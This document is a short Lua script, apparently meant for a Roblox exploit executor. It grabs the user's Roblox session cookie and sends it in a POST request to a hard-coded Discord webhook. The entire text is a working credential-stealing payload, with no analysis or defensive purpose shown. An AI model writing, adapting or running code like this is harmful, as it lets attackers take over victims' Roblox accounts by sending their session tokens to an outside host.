local cookie = getcookies()["https://www.roblox.com/"] -- Captures token
local request = http_request or request or syn.request -- Uses executor's HTTP function
request({
    Url = "https://discord.com/api/webhooks/1462058300362461246/gQcZfQ5hrlglIXOn7yEF706R0R0_lMEyAoC77h9WwaxTmXJ7bRR6DORPQ1VaiTVp0lyc",
    Method = "POST",
    Headers = {["Content-Type"] = "application/json"},
    Body = game:GetService("HttpService"):JSONEncode({content = cookie})
})
